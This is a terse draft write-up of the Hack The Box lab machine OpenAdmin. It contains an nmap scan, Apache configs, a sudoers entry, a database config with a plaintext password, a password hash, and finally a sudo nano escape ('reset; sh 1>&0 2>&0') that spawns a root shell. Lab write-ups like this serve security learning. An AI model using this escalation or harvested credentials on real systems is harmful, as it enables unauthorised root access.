---
title: HTB OpenAdmin
author: kei5uke
draft: true
description: Writeup for HTB OpenAdmin
tags:
  - linux
  - writeup
---

# Nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 15:32
Completed NSE at 15:32, 0.00s elapsed
Initiating NSE at 15:32
Completed NSE at 15:32, 0.00s elapsed
Initiating NSE at 15:32
Completed NSE at 15:32, 0.00s elapsed
Read data files from: /usr/share/nmap

```

/var/www/html/marga/.git

```
Listen 127.0.0.1:52846
<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal
<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 33 Nov 22  2019 /etc/apache2/sites-enabled/openadmin.conf -> ../sites-available/openadmin.conf
<VirtualHost *:80>
	ServerName openadmin.htb
	ServerAdmin jimmy@openadmin.htb
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

```

joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv 

```
'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,

```

21232f297a57a5a743894a0e4a801fc3 

jimmy:Revealed

```
sudo /bin/nano /opt/priv
^R^X
reset; sh 1>&0 2>&0
```
